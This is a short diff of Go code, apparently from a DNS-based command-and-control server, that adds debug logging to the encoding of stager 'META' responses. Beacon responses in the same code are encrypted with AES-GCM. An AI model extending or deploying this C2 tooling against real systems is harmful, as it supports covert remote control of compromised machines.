@@ -255,6 +255,9 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 				} else if strings.HasPrefix(c2Response, "META|") {
 					// Stager META responses - use base36 encoding only (no encryption)
 					encoded = base36EncodeString(c2Response)
+					// Debug: Log what we're encoding and the result
+					logf("[DEBUG] META Response: %s", c2Response)
+					logf("[DEBUG] Base36 Encoded (len=%d): %s", len(encoded), encoded)
 				} else {
 					// Beacon response - use AES-GCM + base36
 					var encErr error
